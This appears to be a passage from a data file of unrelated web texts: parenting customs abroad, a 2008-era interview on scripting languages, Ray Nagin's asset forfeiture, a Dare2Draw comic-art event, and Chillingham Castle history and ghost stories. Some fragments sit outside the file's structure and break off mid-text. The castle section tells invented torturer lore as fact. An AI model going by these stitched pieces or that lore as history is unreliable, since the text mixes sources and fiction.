a group is a skill,\" she declares, and it's one that the French assiduously cultivate in their kids.\n\nChildren should spend less time in school.\n\nChildren in Finland go outside to play frequently all day long. \"How can you teach when the children are going outside every 45 minutes?\" a recent American Fulbright grant recipient in Finland, who was astonished by how little time the Finns were spending in school, inquired curiously of a teacher at one of the schools she visited. The teacher in turn was astonished by the question. \"I could not teach unless the children went outside every 45 minutes!\"\n\nThe Finnish model of education includes a late start to academics (children do not begin any formal academics until they are 7 years old), frequent breaks for outdoor time, shorter school hours and more variety of classes than in the US. Equity, not high achievement, is the guiding principle of the Finnish education system.\n\nWhile we in America preach the mantra of early intervention, shave time off recess to teach more formal academics and cut funding to non-academic subjects like art and music, Finnish educators emphasize that learning art, music, home economics and life skills is essential.\n\nWhy it's better: American school children score in the middle of the heap on international measures of achievement, especially in science and mathematics. Finnish children, with their truncated time in school, frequently rank among the best in the world.\n\nThou shalt spoil thy baby.\n\nTomo, a 10-year-old boy in our neighborhood in Japan, was incredibly independent. He had walked to school on his own since he was 6 years old, just like all Japanese 6-year-olds do. He always took meticulous care of his belongings when he came to visit us, arranging his shoes just so when he took them off, and he taught my son how to ride the city bus. Tomo was so helpful and responsible that when he'd come over for dinner, he offered to run out to fetch ingredients I needed, helped make the salad and stir-fried noodles. Yet every night this competent, self-reliant child went home, took his bath and fell asleep next to his aunt, who was helping raise him.\n\nIn Japan, where co-sleeping with babies and kids is common, people are incredulous that there are countries where parents routinely put their newborns to sleep in a separate room. The Japanese respond to their babies immediately and hold them constantly.\n\nWhile we think of this as spoiling, the Japanese think that when babies get their needs met and are loved unconditionally as infants, they more easily become independent and self-assured as they grow.\n\nWhy it's better: Meret Keller, a professor at UC Irvine, agrees that there is an intriguing connection between co sleeping and independent behavior. \"Many people throw the word \"independence\" around without thinking conceptually about what it actually means,\" she explained.\n\nWe're anxious for our babies to become independent and hurry them along, starting with independent sleep, but Keller's research has found that co-sleeping children later became more independent and self-reliant than solitary sleepers, dressing themselves or working out problems with their playmates on their own.\n\nChildren need to feel obligated.\n\nIn America, as our kids become adolescents, we believe it's time to start letting them go and giving them their freedom. We want to help them be out in the world more and we don't want to burden them with family responsibilities. In China, parents do the opposite: the older children get, the more parents remind them of their obligations.\n\nEva Pomerantz of the University of Illinois at Urbana Champaign has found through multiple studies that in China, the cultural ideal of not letting adolescents go but of reminding them of their responsibility to the family and the expectation that their hard work in school is one way to pay back a little for all they have received, helps their motivation and their achievement.\n\nEven more surprising: She's found that the same holds for Western students here in the US: adolescents who feel responsible to their families tend to do better in school.\n\nThe lesson for us: if you want to help your adolescent do well in school make them feel obligated.\n\nI parent differently than I used to. I'm still an American mom -- we struggle with all-day snacking, and the kids could use more practice being patient. But 3-year-old Anna stands on a stool next to me in the kitchen using a knife to cut apples. I am not even in earshot when 6-year-old Mia scales as high in the beech in our yard as she feels comfortable. And I trust now that my boys (Daniel, 10, and Benjamin, 12) learn as much out of school as they do in the classroom.\n\nWATCH:\n\nAlso on HuffPost:",
  "latent_3796": "The former second-class citizens of the programming world have leaped to the fore, changing the face of enterprise software development. With the rise of Web 2.0, scripting languages (also called dynamic languages) are now often considered important tools in a developer's arsenal. That's a far cry from than their old reputation as lesser tools for those who can't handle \"real\" programming.\n\nDynamic languages are certainly popular. Almost 70 percent of the 1,200 developers surveyed by Evans Data for its most recent Global Development Survey currently use JavaScript, the most popular dynamic language, with fifteen percent more planning to adopt it. PHP is used by just over a third of developers, and Perl has captured about a quarter of developers (though Perl is much more popular in North America, with 36 percent spending at least some of their time using it).\n\nHowever, like any other tool, dynamic languages are not necessarily interchangeable. Each has its place in a programmer's toolkit. We asked a group of luminaries in the scripting world for their perspectives on the current state of the scripting universe, and how it has changed since we last looked at the scripting language scene in 2005.\n\nNorris Boyd is the creator and maintainer of Mozilla Rhino, a JavaScript implementation for Java. Boyd was part of the JavaScript team at Netscape. Today, he is an engineering manager at Google.\n\nRichard Dice is the president of the Perl Foundation, the organization which has responsibility for Perl's legal, organizational, technical and administrative infrastructure.\n\nJeff Hobbs is director of languages and Tcl tech lead at ActiveState Software and a member of the Tcl core team.\n\nSteve Holden is chairman of the Python Software Foundation, and author of Python Web Programming.\n\nJohn Lam leads the IronRuby team at Microsoft.\n\nRohan Pall, representing PHP, is a consultant who has been programming Web applications for almost a decade.\n\nCIO.com: What place do scripting languages have in today's computing environment?\n\nBoyd: The biggest change since 2005 has been the growth of richer Web applications that perform more of their computations in the browser using JavaScript. The demand for these applications has forced developers to learn and use JavaScript much more than before.\n\nThere's also been a lot of interest in Ruby, another dynamic language, spurred by the release and growth of Ruby on Rails. As a result of these changes, many developers are becoming more comfortable with dynamic languages.\n\nDice: Since 2005, there haven't been any singular events that changed the way scripting languages are used or their capabilities. They have evolved (more in perception than in real capability) from a place where they were used only for simple tasks or prototyping of new systems into much more general use. The general upward slope in their acceptance and capabilities in that time, though, means that CIOs definitely need to put them on their radar and develop \"scripting language awareness.\" In late 2007, Forrester Research published its Forrester Dynamic Language Wave survey, so research on the topic is out there to work with.\n\nHobbs: Scripting languages are increasingly prevalent in Web applications, with PHP's growing popularity and the rise of Ruby on Rails, while maintaining their dominance in important daily tasks such as machine and test automation with Tcl and data manipulation with Perl. Python is finding increasing use in the scientific communities.\n\nHolden: Scripting languages are being used in a wide range of application areas. Python has recently achieved increased visibility in many areas of science and engineering, particularly in bioinformatics. Three significant Web frameworks (Django, TurboGears and Pylons) have reached maturity in the last three years.\n\nScripting languages have a place anywhere that a systems programming language (e.g., implementing an operating system) is not required. Otherwise they fit basically anywhere, whether it be on the server or the desktop. Python excels in all these areas!\n\nLam: In general, it's easier to create and change code written in a dynamic language. Much of the Web has traditionally been created using dynamic languages, from Ajax on the client to server code written in PHP, Perl, Python and Ruby. Ruby on Rails in particular has driven a lot of interest towards Ruby, and is one of the preferred platforms to build Web 2.0 startups on.\n\nPall: In the last three years, we've seen the adoption of very fast CPUs, namely the Intel Core 2 line. Breaking the 3GHz barrier on this architecture—and now pushing 4GHz—has sped up dynamic language code to the point where many algorithms that simply weren't feasible to implement in PHP are now possible on commodity hardware.\n\nIn the last year, I've participated in writing text analysis software for auto-classifying documents. Our initial plan was to use C to do the heavy processing and PHP for the rest. As it turned out, on midrange commodity hardware, we were able to use PHP throughout and maintain solid performance. Web applications are commonly scripted, but in my experience, even internal processing-intensive applications are now commonly being implemented in modern, dynamic, scripting programming languages. The bulwarks have been breached and progress is now ushered in.\n\nNext: How have attitudes changed towards dynamic languages?\n\nCIO.com: What changes are you seeing in attitudes towards scripting (dynamic) languages?\n\nBoyd: The increased use of JavaScript for browser-based applications is sparking interest in JavaScript as a language for use outside the browser. I work on Mozilla Rhino, which is a JavaScript environment for Java, and we have seen a lot of people using Rhino on the server side to add scripting to their applications. It's a nice extension language for applications since it was designed from the start to run inside another application.\n\nDice: I'm noticing changing attitudes from several angles. As I mentioned before, Forrester Research released a Wave survey paper last year regarding dynamic languages. This was motivated by their noticing that their customers were using more dynamic languages and requesting information on the competitive landscape in the field of dynamic languages.\n\nTools companies, including Eclipse and ActiveState, are offering more and better products for working with dynamic languages.\n\nA segment of Java programmers seem to be embracing Ruby (and Rails) in particular. A new dynamic language, Groovy, is capitalizing on this trend by providing a dynamic language on the Java Virtual Machine (JVM) that incorporates elements of both Java and Ruby.\n\nSupport for independent software vendors (ISVs) with dynamic languages is also improving. The Linux Foundation's recently-released LSB 3.2 spec includes Perl and Python as first-class supported languages within the spec, so ISVs who target this spec for their software can depend on Perl and Python being present in regularized configurations.\n\nHobbs: The dynamic languages are becoming more accepted. This is in part through more acceptance of open-source software, which all the dominant dynamic languages are (versus Java and .Net, which are questionably open in their process and/or sources). It is also due to good frameworks being developed using newer languages such as Ruby on Rails. You also see larger organizations fostering support for the languages, such as Google's support of Python, which was made their primary development language for Google App Engine.\n\nHolden: People seem more positive towards scripting languages. They have, over time, come to realize that their performance is such that they work for most problems and have also learned that the compilation step can be heavy-handed and a huge time sink in the development cycle.\n\nThere is now a more general appreciation of the advantages of dynamic languages, whose characteristics are well-suited to Agile test-driven development techniques that have also become more popular in the same time frame.\n\nThe last three years have seen increased uptake in dynamic languages in many application areas. For Python in particular, the IronPython (now a Microsoft open-source project) and Jython (whose primary developer was recently hired by Sun Microsystems) implementations have had a positive impact.\n\nLam: Compilation is orthogonal to static/dynamic. IronRuby is a compiled language (and an interpreted one too— we offer both options), yet it is clearly a dynamic language. So it's better to say that there are changes in attitude between static versus dynamic languages.\n\nThere is a \"polyglot programmer\" meme going around which roughly says that future systems will be built on a statically typed library foundation (e.g. BCL in .Net) with a dynamically typed language used in a dual role to both script those static types as well as define a domain-specific language (DSL) which will be used to implement the high level app logic.\n\nPall: For a large number of applications, when deciding what technology to use, it is no longer the case that the debate centers around dynamic languages versus compiled languages. Scripting is now considered real programming, and indeed most people don't even use the word \"scripting\" when describing what they do, but instead call it \"programming.\" These days, it boils down to which dynamic programming language to use, not if you should use one.\n\nNext: Has Ajax made a difference?\n\nCIO.com: What effect has the growing prevalence of Ajax had on the adoption of the various languages? Are people adapting the techniques to languages other than JavaScript?\n\nBoyd: Other than a greater comfort with dynamic languages, I don't know of specific impacts of Ajax on other languages. The techniques of Ajax are really only applicable inside the browser.\n\nDice: Ajax is entirely a JavaScript phenomenon—it stands for \"Asynchronous JavaScript and XML.\" It is not so much a technology itself as a way of combining several existing technologies (CSS, XHTML, XML, DHTML and JavaScript, and the various document object models (DOMs) available within modern Web browsers). Taking these technologies together and calling them Ajax, Web applications can be made much more usable, visually appealing and functionally rich than previous Web application development paradigms afforded.\n\nThe first scripting language to benefit from Ajax in a big way was Ruby, though this was much more an accident than anything else. A Ruby Web rapid application development framework called Ruby on Rails started gaining attention in 2005. It had three things in its favor: it was based on the Ruby language (which a lot of people find quite nice to program with), developers found it to be a significant boost to productivity, and it was the first framework to integrate with any Ajax library. So it quickly became identified with Ajax and vice versa. Nowadays, every major scripting language has decent integration with every major Ajax library.\n\nMost Ajax usage in Web applications development involves interaction with the server-side of the Web application. The front end of the application—the end that lives on the Web browser—is HTML, Javascript, Ajax, etc. The front end interacts with (and most often is dynamically created by) the back-end, which can be programmed in Perl, Python, Ruby (or Java, C++, Smalltalk, Lisp, etc.).\n\nHobbs: JavaScript is just the front-end language, often with a dynamic language on the back-end. These are commonly Python, PHP or Ruby (Rails), as they have become popular through common Web frameworks. Dynamic languages are common because they are much easier to use than Java or .Net on the background, providing as much as 10x more developer productivity. You can always throw more hardware at a problem, but getting something solid out on time is key, and dynamic languages provide great leverage to succeed.\n\nHolden: Since Ajax is simply asynchronous network calls, it is not affecting the adoption of any specific language beyond more JavaScript usage in webpages. The technique of Ajax is in no way new and has been available for decades, including in Python.\n\nIn the Python world, the TurboGears framework in particular accommodates support for several well-known Ajax toolkits, but the emergence of Ajax is essentially orthogonal to the language used for Web development, and is as likely to be used in the ASP.Net environment as by Python users.\n\nLam: Ajax is popular because browsers are popular. JavaScript's popularity is directly tied to the fact that it's deployed on virtually all browsers today. Right now, there really aren't any other dynamic languages for the browser that are widely deployed, so nobody's really trying. I coined the term ARAX to try and drive some thinking around using Ruby in the browser as an alternative language to JavaScript. That generated some interest in the Rails community since they would be interested in running some of their Ruby code in the browser.\n\nPall: Ajax is a very specific technology that allows webpages to rise above mediocre user-interfaces and become true applications using JavaScript. Flash ActionScript has had this capability for a while, but now lightweight solutions are possible without depending on proprietary tools like Flash that are sometimes not available for use in large internal projects or secure sites.",
  "latent_3832": "Convicted former Mayor Ray Nagin must hand over $501,200 connected to illicit gains he made during and shortly after his tenure at the head of New Orleans city government, a federal judge ruled Tuesday (May 27).\n\nThat's the full amount sought by federal prosecutors in an asset forfeiture proceeding initiated after Nagin was convicted of public corruption. U.S. District Judge Ginger Berrigan issued a brief order on the matter, noting that her decision on the money is considered \"preliminary\" until Nagin is sentenced.\n\nNagin is set for sentencing on June 11, but his attorney is seeking a delay.\n\nIn February, a jury convicted Nagin on 20 counts, including bribery, money laundering and tax and wire fraud for accepting cash and gifts in exchange for lucrative city contracts. He faces a potentially lengthy prison term, which experts have pegged at roughly 20 years, plus fines.\n\nHis lawyer, Robert Jenkins, has vowed to appeal.\n\nIn their forfeiture request, prosecutors argued that Nagin should be on the hook for every penny connected to 16 of his criminal convictions: one count of conspiracy to defraud the public of his honest services, six counts of accepting bribes, and nine counts of wire fraud related to payments he received after he left office.\n\nNagin was also convicted on four counts of filing false tax returns, but prosecutors sought no forfeitures in connection with those charges.\n\nJenkins, in his response to the government's forfeiture effort, did not fight most of its claims. Having convinced a jury that Nagin was guilty beyond a reasonable doubt, prosecutors were entitled to go after any money tied to the convictions, he conceded.\n\nHowever, Jenkins argued that Nagin shouldn't be solely liable for about $222,000 in benefits he accrued during his time in office.\n\nRoughly $52,000 of that came in the form of granite shipped at the behest of convicted co-conspirator Frank Fradella to a business Nagin owned with his sons.\n\nThe remaining $170,000 was the value of contracts Home Depot, under pressure from Nagin, awarded the same business.\n\nSince Nagin wasn't the sole partner in the company, he shouldn't be solely held responsible for paying it back, Jenkins argued.\n\nBerrigan wasn't having it.\n\nIn a criminal conspiracy, all parties can be held equally liable for the total amount of the proceeds of the conspiracy, she said in her order.",
  "latent_3842": "On the 26th of September, the nonprofit sketch night and comic art competition Dare2Draw gathered at the Society of Illustrators in Manhattan for their monthly challenge, joined by special guest mentor and judge Alex Maleev (Daredevil, Spider-Woman, Moon Knight). The events have been running for about a year at the well-suited venue, and at previous venues for about 5 years under the guidance of founder Charles D. Chenet, and in that time have gained quite a following of aspiring and working comic book artists, some of whom even commute into the city to take part. The evening was not particularly unusual in Dare2Draw’s lineup given their previous history of influential guest mentors like Phil Jimenez and Jamal Igle, but opening time still meant eager lines forming, and even after the event was underway, the large venue continued to fill. When there were simply no seats left to use, the remaining latecomers were allowed to enter for free and lined up against walls, or continued to stand to take part.\n\nThough I’ve heard a lot about Dare2Draw and continually take in reports about the events from artists who have attended, it was my first opportunity to observe the phenomenon in person and see first-hand what it was all about. Of course, I could easily see the benefit of having live costumed drawing and even competitions for comic book artists, but the sheer degree of enthusiasm from friends and acquaintances piqued my interest. I wanted to know what exactly about the gathering inspired such energy and approbation from the artists who turned up on a monthly basis and why they came away from it even more committed to their art. From what I had heard, the whole ordeal was quite grueling, but it definitely left people wanting to come back for more.\n\nHost and art-mentor Simon Fraser (2000AD, Nikolai Dante, Lilly Mackenzie) opened the first part of the evening, live timed sketching with costumed models, this time Xena themed with Xena herself and Hades in appearance in detailed costumes hand-made by the models. Speakers pumped in techno Sinatra crooning and the crowded room got busy, a sea of bobbing heads and slowly building adrenaline. Large red-lit numbers on a sporting-event style clock counted down through three full sessions of timed drawing of the models in various poses, each session containing several intervals. It amounted to a substantial amount of time drawing as precisely as possible while watching the clock. It occurred to me that, from what I’ve heard and seen, most comic artists spend the vast majority of their time working alone and this made the experience of a Dare2Draw event unusual, a point in time that changed up the rituals of daily life for the artists involved and challenged them to perform under very different circumstances.\n\nThey were able to, glancing around, see what other artists were up to in a clashing diversity of styles and interpretations, and see some artists whose work seemed much more polished than their own, as well as those who represented earlier stages of their own development. The push forward, to create on the clock, seemed to create a building energy rather than frustration. This could be what comics artists consider a good night out. Not only do they get to be surrounded by other artists, converse, and network, but they get to flex muscles that aren’t as frequently pushed to the limit. Not to mention that these skills could be useful in future when working under the legendarily difficult deadlines that comics artists all too frequently face. But the intervals were also filled with instruction.\n\nSimon Fraser, Charles Chenet, and Alex Maleev moved constantly around the narrow aisles, critiquing, and giving practical professional advice to artists who might be new to them or could be artists whose work they’ve seen evolve over time. This was a kind of comics boot camp, and the participating artists couldn’t get enough of it. This hammered home some of the principles behind Dare2Draw’s events, an assumption that comic artists don’t get enough opportunity to meet eachother, discuss their projects, work on their technique, or simply be in an environment for a few hours where they can be sure that other people feel the same motivations that drive them and also consider their art a valid career choice. The demographic of artists attracted to this workshop and competition was wide-ranging, with a ratio of about one woman to three men, and an age range anywhere from late teens to mid 40’s, though the well-represented median age was probably mid 20’s to mid 30’s.\n\nSome were clearly art students, but many probably pursued art classes more informally due to day jobs and other commitments. They worked in a variety of media even on quick sketches, from pencils, to precise inks, to ink brushes in broad strokes and dashes of color. Working under time constraint produced confident forays into personal style. Without time for reflection, the sketches often came out to be quite firmly original in their execution. That might also be a productive thing in itself, since without time for external reference or the demands of a particular client, artists produced what could only be pretty firmly their own work for their own benefit.\n\nAbout half way through the three and a half hour evening, things changed gears. It was time for guest mentor Alex Maleev to produce this “theme” for the event, followed by the Dare2Draw competition itself. Maleev had already been moving around the room giving tips and comments, circling round artists to make sure he could see every sketchbook and carefully navigating all the quadrants of the area.\n\nWhat Maleev said, as he stood up on the dais, was somewhat surprising, openly admitting his own reticence to speak in public or instruct others, but willing to simply share some strategies that work for him to break up the tedium of drawing alone and make sure his work is infused with enough real-world variety.\n\nI’m nervous because I work alone and I don’t talk to people and I’m not good at talking to people. I have no social skills whatsoever. But I will do my best tonight to entertain you. I’m nervous because what I’m about to do I don’t enjoy. I’ve never done it in front of a live audience. We’re going to saw one of you in half.\n\nMaleev said, to peals of laughter. Gesturing for quiet for this serious undertaking, he continued:\n\n“It’s all about anatomy, but you guys know this already. It’ll be fine. The best way to do this is we’re going to get a guy who’s in shape. And we’re going to cut him in half. I’m not going to be doing the cutting. One of you will.\n\nFor a guy who doesn’t like speaking in public, he did an excellent job breaking the ice. On a more or less serious note, he added:\n\nI was asked to come up with a theme for tonight, and I didn’t. I should have thought about it. I forgot all my watercolors. I had to work with plan B. To talk about live drawing and how I actually do find my models or “victims”. But what I want to do is show you is what I do on the subway when there are real people right in front of me. Unless they are beautiful girls, and this is the way to have a conversation, I do watercolors because girls love everything in colors. If you are good in watercoloring and collageing and you have a tattoo (gestures to self), I think you’re all set.\n\nHe instructed,\n\nWe’re going to pretend that we’re on the subway and you’re going to be sitting in front of me and I’m going to be drawing you while you’re not watching. That’s my theme of the night. We can find our models anywhere. We don’t have to be here on Thursday evening. It could just be anywhere in the city. There are way too many people in the city already. So you can find tons and tons of people and I bet you I’ve drawn hundreds on the subway in the 20 years I’ve lived here. And no one has ever complained. No one. Which means you probably are not going to get beat up. But if you have good fighting skills, go for it.\n\nAs he selected six “victims” to be his subway models, he commented on the fact that he purposefully allows Brian Michael Bendis to speak for him when he makes rare panel appearances at cons, but because speaking in public is so unusual for him, he urged the artists to pay attention and try to take home the lesson he was presenting for them about how to make your life work for you to inspire your art.\n\nThe audience watched Maleev’s work with rapt attention, crowding in to get the best views of his rapid, often quite angular strokes, moving his chair and assuming different angles depending on the model. Each model took on slightly different activities, from reading, to listening to music, to sketching, in one case, actually sketching Maleev right back, though generally they were encouraged to be unaware of his presence. At irregular intervals, he’d announce that his subject had suddenly left the train or that they’d reached the end of the line, leaving sketches partial or complete based on real-life circumstances. He illustrated the possibilities of even short public transport rides to seize character reference and make the time spent useful. At one point, Chenet pointed out, to applause, that the entire audience was busy drawing Maleev drawing subway subjects. It was true; the place was a collage of fedora-wearing serious men bent over sketchbooks in myriad styles. There are now more portraits of Alex Maleev in existence than have ever existed before.\n\nAfter a break to recover from watching Maleev produce fine-art quality sketches in such brief bursts of time (and the models who supplied him their sketchbooks were allowed to keep their Maleev portraits), things settled in for the competition portion of the evening, whose theme was announced to be “Sexy Vampire”. Competitors were encouraged to think outside the book in terms of subject matter. “Think it through”, Fraser instructed, “Don’t just draw the biggest boobs you can think of”, which prompted amusement, “Think about what “sexy” means. Think about what “vampire means”. This reminded everyone that the competition itself was instructive, producing the best work they could summon in a half hour period. You could have heard a pin drop if not for the well-mixed soundtrack playing during the challenge. Those participating were reaching for prizes from t-shirts to books, but most of all, of course, the selection of the judges and the encouragement that would come with that, the recognition that they were making strides in their style.\n\nAt this point, I ceased to be an observer and became a participant. Not in the competition itself, but as a judge. I was totally unprepared for this turn of events. Though I’ve taken a couple of classes at the Society of Illustrators before, I had opted to use a notebook that night instead of a sketchpad, and I have to confess that like everyone else, I was in awe of Maleev. For those of you who haven’t seen him or met him, he comes off as something like the Most Interesting Man in the World like the Dos Equis commercial, only in comics. And he was drinking bourbon. He doesn’t always drink bourbon, but when he does…you get the scenario. But I was strong-armed into judging alongside Maleev and when he asked how I felt about judging, I said, “Scared”. He wasn’t phased by my trepidation.\n\nWithout giving too many of the mysteries behind Dare2Draw judging away, it’s safe to say that it was difficult to keep my head in the game since I was as interested in watching the choices Maleev was making and how he made them as trying to be as objective as possible myself. But it was quite an equal decision-making process when it came down to it, with plenty of shuffling, and weighing between choices. I learned a few tips myself about comic art just by listening to his comments. He’s big on originality, unsurprisingly, and that spark that sets artists apart from mainstream images that have been too recycled.\n\nPresenting the awards was an opportunity to see just how excited artists were to be selected, and how supportive they were of each other. Judging from reactions, the choices were surprising, with several first-time winners. They would have something significant to think about, maybe a reconsideration of the merits of their work, that evening. It was, in the end, quite a marathon event, demanding the most out of participants, and the event organizers, as well as Maleev, but the benefits, and the positive energy it generated, were unmistakable.\n\nWhen I had wondered earlier why artists always smiled when talking about attending a Dare2Draw event, I hadn’t taken into account the sense of accomplishment created simply by surviving one to the end of the race, and fully committing to crossing the finish line. Participating means casting away comfort zones. The experiences would no doubt be something artists would continue revisiting over the next month, in the hours spent alone, or when pushing themselves to take out their sketchbooks on the subway for the first time. If comic art can be a religion, as I’ve heard many say, then this was an incremental gathering and reaffirming rite of participation.\n\nI learned from asking around that this standing-room only event is the norm each month, with increased numbers a feature of 2013 meetings. And also that in November (the 14th), Dare2Draw are experimenting with a much larger venue and doubling the number of models with guest mentor Bill Sienkiewicz. They are also ramping up their New York Comic Con presence with a booth hosting free portfolio reviews (booth AA D11) from a small army of professional artists who support their mission and want to help out from Phil Jimenez, to George O’Connor, Gary Erskine, Amy Reeder, Jamal Igle, and others. They are also currently running a Kickstarter until mid-October to film a pilot TV episode for a reality comic art competition show modeled on their live events (which I’ve written about previously for Bleeding Cool).\n\nThere’s a tremendous energy behind all of these forms of outreach, but there is still a practical need for more charitable support. Current sponsors include several brands of art supplies such as Pentel, Blueline Pro, and Copic, as well as Dark Horse, but it’s a shoe-string budget that relies heavily on volunteers to keep things running from one month to the next. That’s both unsurprising in this harsh economic climate and somewhat disheartening when looking toward the future of comic art. The odds are quite high that in the room on the 26th there were at least a few artists who will be the next big names in comic art. Would that have eventually happened if they hadn’t had the encouragement of these events, or the professional networking it encouraged? Maybe, but the events could very well end up being a deciding factor in whether artists pursue what is and has always been a very challenging and often isolated profession. Here’s hoping that potential sponsors take notice of what’s becoming a groundswell series of events for artists sooner rather than later.\n\nHannah Means-Shannon is senior New York Correspondent at Bleeding Cool, writes and blogs about comics for TRIP CITY and Sequart.org, and is currently working on books about Neil Gaiman and Alan Moore for Sequart.

I think it's eating away at the living standards, the middle class lifestyle, the hopes and aspirations of millions of Americans, that their hard work is not paying off.\n\n\"I think that is both an economic crisis and a political crisis. Because when people feel that they are being left out ... then that gives rise to a lot of anxiety, insecurity, frustration, even anger in the political system. We're seeing that on both sides of the aisle, but particularly with Mr. Trump and his outrageous appeals to paranoia and prejudice. He gets some of the reaction he does in part because people are genuinely worried and anxious and looking for answers. I think if we don't start seeing wages rise, we will have a lot of political headwinds that could very well bring people into office who have a view of both the economy and our democracy at odds with what personally I think is in our best interest.\"\n\nHillary Clinton in Iowa: I oppose Keystone oil pipeline\n\nOn what kind of transparency she'd have in her White House for people who want to know what's going on with the government:\n\n\"Well, you can count on me not to have a private email server.\n\n\"...I see the pressures that are at work and how hard it is to manage the flood of information that is both coming and going.

It's been another month so we're posting another update on the progress of our A-4E.\n\nFirst and foremost, we decided to redo our cockpit, both model and texture. A new base model and geometry was integrated into DCS, and then we migrated our existing gauges and animations from the old cockpit to the new one. In the process, we fixed a lot of small indicators and gauge needles to improve readability and accuracy, as well as prepping the way for instrument lighting (both backlight and flood) in the future. On top of the ported gauges, we've added many new gauge animations that are just waiting on systems programming.\n\nSecond, we've implement the Aircraft Weapon Release System.

  "latent_3994": "Chillingham Castle is a medieval castle in the village of Chillingham in the northern part of Northumberland, England. It was the seat of the Grey family and their descendants the Earls of Tankerville from the 13th century until the 1980s. The Chillingham Wild Cattle, formerly associated with the Tankerville family, may be viewed from the castle grounds. The castle is a Grade I listed building.\n\nHistory:\n\nThe castle was originally a monastery in the late 12th century. In 1298, King Edward I stayed at the castle on his way to Scotland to battle a Scottish army led by William Wallace. A glazed window in a frame was specially installed for the king, a rarity in such buildings at the time. The Chillingham Wild Cattle occupy land adjacent to the castle, formerly owned by the Sir John Knott Trust, now owned by the Chillingham Wild Cattle Association (a charity not associated with the castle).\n\nA 19th-century depiction of the castleThe castle occupied a strategically important location in medieval times: it was located on the border between two feuding nations. It was used as a staging post for English armies entering Scotland, but was also repeatedly attacked and besieged by Scottish armies and raiding parties heading south. The site contained a moat, and in some locations the fortifications were 12 feet thick.\n\nThe building underwent a series of enhancements, and in 1344 a Licence to crenellate was issued by King Edward III to allow battlements to be built, effectively upgrading the stronghold to a fully fortified castle, of quadrangular form.\n\nIn 1617, James I, the first king of both England and Scotland, stayed at the castle on a journey between his two kingdoms. As relations between the two countries became peaceful following the union of the crowns, the need for a military stronghold in the area declined. The castle was gradually transformed; the moat was filled, and battlements were converted into residential wings. A banquet hall and a library were built.\n\nIn the 18th and 19th century the grounds underwent landscaping, including work carried out by Sir Jeffry Wyattville. The once extensive park, now under a separate ownership from the castle, is home to the famous Chillingham Wild Cattle.[2]\n\nDuring World War II, the castle was used as an army barracks. During this time, much of the decorative wood is said to have been stripped out and burned by the soldiers billeted there. After the war, the castle began to fall into disrepair. Lead had been removed from the roof, resulting in extensive weather damage to large parts of the building. In the 1980s, the castle was purchased by Sir Humphry Wakefield, 2nd Baronet, whose wife Catherine is remotely descended from the Greys of Chillingham. He set about a painstaking restoration of the castle. Sections of the castle are open to the public, and holiday apartments are available for hire.\n\nChillingham’s ghosts:\n\nIts current owners market the castle as being the most haunted castle in Britain. It has been investigated on television and radio (namely, Most Haunted, I’m Famous and Frightened!, Scariest Places On Earth, Holiday Showdown, Alan Robson’s Nightowls) and now Ghost Hunters International. Some of these ghosts are written about are referred to in a 1925 pamphlet by Leonora, Countess of Tankerville. Others, such as John Sage, are of more recent invention.\n\nThe most famous ghost of the castle is the “blue (or radiant) boy”, who according to the owners used to haunt the Pink Room in the castle. Guests supposedly reported seeing blue flashes and a blue “halo” of light above their beds after a loud wail. It is claimed that the hauntings ceased after renovation work revealed a man and a young boy inside a 10-foot-thick wall. Documents dating back to the Spanish Armada were also found within the wall.\n\nSource: http://en.wikipedia.org/wiki/Chillingham_Castle\n\nMost of the Chillingham Castle ghosts are not the literally, ‘tortured souls’, that one might expect to find given the atrocities that went on there. Built over 800 years ago to stop the Scots from invading England. Anyone captured would find themselves in the Dungeon with its Torture chamber, the floor of which slopes to allow the blood to drain away.\n\nThere was no escape except death and prisoners made marks on the walls, which can still be seen, counting off the days until this merciful release from their unendurable suffering. If a prisoner was really unlucky then he came in for the attention of John Sage.\n\nJohn Sage\n\nThis cruel and sadistic torturer, who died about 1200, has often been seen wandering around the castle. He used to take great pleasure in his grisly work, even devising new and ‘improved’ methods of inflicting pain on his victims. During the three years he held the job, he is said to have tortured to death over 7,500 people and killed several hundred others in various ways.\n\nAt the end of the war with the Scots, wanting to rid the castle of the prisoners, he rounded up the Scottish adults and older children being held and burnt them to death in the court-yard. He then took an axe, which can still be seen, and hacked to death the smaller children in the Edward room. The chandelier in that room sometimes swings by itself and people report a foul smell and strange atmosphere.\n\nJohn Sage’s undoing was when he accidentally strangling his girlfriend as they made love on the ‘torture rack’ in the castle dungeon. Unfortunately for John Sage, his girlfriend’s father was a Border Reiver who said that he would gather a great army and attack the castle if Sage was not put to death. John Sage was publicly hanged from a tree in the castle grounds in front of a very large and enthusiastic crowd. And as he slowly died, people cut off pieces of him as ‘souvenirs’. So ended the life of a truly detestable man.\n\nRadiant Boy or Blue Boy\n\nThe most famous of the Chillingham Castle ghosts was the ‘Radiant Boy’ or ‘Blue Boy’. The sound of a young child in absolute terror or fear would be heard at the stroke of midnight in the Pink Bedroom coming from a point where a passage had been cut through the 10 foot thick walls. The sound would suddenly cease and the wraith of a young boy, dressed in blue and surrounded by a bright aura would approach the old four-poster bed.\n\nIn the 1920’s, building work was being carried out and the bones of a child were discovered along with scraps of blue bones were discovered. These were interred in the local graveyard and the Radiant Boy ceased making his appearances.\n\nHowever, people who sleep in the bed in the Pink Room, report that one wall of the room still lights up with bright flashes of blue light.\n\nTwo lady ghosts\n\nA Chillingham Castle ghost who can be seen today haunts the ‘Inner pantry’. She is very frail and dressed in white, hence the name by which she is known. A watchman who slept in the room to guard the silver that used to be store there, saw the woman whom he assumed to be a guest. She asked him for water and as he turned to get her some, she disappeared. It has been suggested that the reason the spectre was so thirsty was that she had been poisoned.\n\nLady Mary Berkeley is another Chillingham Castle ghost. She is not seen but the rustle of her dress is heard by visitors or they feel a sudden cold chill as she endlessly searches for her husband. He scandalised the area when, in the 1600’s, he seduced and ran off with his wife’s younger sister. Poor Lady Mary was left all alone in the castle with just her small baby girl for company.\n\nSource: http://www.real-british-ghosts.com/chillingham-castle-ghosts.html\n\nGhost Hunters International at Chillingham Castle",

